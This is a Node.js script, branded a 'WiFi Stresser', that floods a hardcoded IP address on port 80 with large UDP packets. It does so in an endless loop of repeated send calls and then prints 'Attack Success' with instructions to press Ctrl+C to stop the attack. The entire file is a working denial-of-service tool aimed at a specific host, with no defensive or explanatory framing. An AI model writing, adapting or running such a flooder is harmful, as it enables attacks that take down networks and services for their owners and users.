const dgram = require('dgram');
const Header = require('headerhelp');
const target = '88.218.117.79';
const port = 80;

function generatePayload(size) {
    let payload = Buffer.alloc(size);
    payload.fill('A');
    return payload;
}

const payload = generatePayload(65500);

setInterval(() => {
    const socket = dgram.createSocket('udp4');
    for (let p = 0; p < 50; p++) {
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
    }
    socket.send(payload, 0, payload.length, port, target, (err) => {
        if (err) {
            console.error('Error sending message:', err);
        }
        socket.close();
    });
});

console.clear();
const header = new Header({
              bannerTitle: 'WIFIA',
              bannerStyle: 'ANSI Shadow',
              bannerColor: ['#ffd700', '#f8f8ff'],
              littleTitle: true,
              clear: true
            });
            header.setArgs({
              separator: `—`,
              name: ` WiFi Stresser by Denis Putra `,
              info: [`Attack Success`]
            });
            header.print();
console.log(`Ctrl + C To Stop The Attack`);
